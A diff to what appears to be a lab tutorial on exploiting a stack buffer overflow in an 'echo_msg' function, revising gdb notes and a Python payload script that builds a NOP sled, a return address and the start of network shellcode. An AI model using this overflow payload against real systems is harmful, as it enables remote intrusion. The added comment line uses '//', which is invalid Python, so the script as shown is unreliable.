@@ -187,7 +187,7 @@ Breakpoint 2, 0x0000000000400994 in echo_msg ()
 ```
 
 
-We can see where our injection is being written to after strcopy. In our case it is at 0x7fffffffd460.
+We can see where our injection is being written to after `strcpy`. In our case it is at 0x7fffffffd460.
 
 ```
 (gdb) disass echo_msg 
@@ -254,11 +254,11 @@ Program received signal SIGSEGV, Segmentation fault.
 
 We want to modify our payload so it goes to the top of our nop slide, which we found to be at 0x7fffffffd460. 
 
-We go into the payload and modify the return address to correspond to the right location.
+We go into the payload and modify the return address to correspond to the right location. 0x7fffffffd460 are 6 bytes in total, but the return pointer in a 64-bit system is 8 bytes long, so what we really want to inject is 0x00007fffffffd464 (added 4 bytes just to be sure). So we accordingly change our python payload script:
 ```
 $ cat payload.py
-# ret_addr = b"\x00\x00\x7f\xff\xff\xff\xdc\xc4"[::-1] // Code from before
-ret_addr = b"\x00\x00\x7f\xff\xff\xff\xd4\x64"[::-1]
+# ret_addr = b"\x00\x00\x7f\xff\xff\xff\xdb\x40"[::-1] // Code from before
+ret_addr = b"\x00\x00\x7f\xff\xff\xff\xd4\x64"[::-1] // print it out in reverse because little endian
 
 buf = b"\x90"*20
 buf += 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
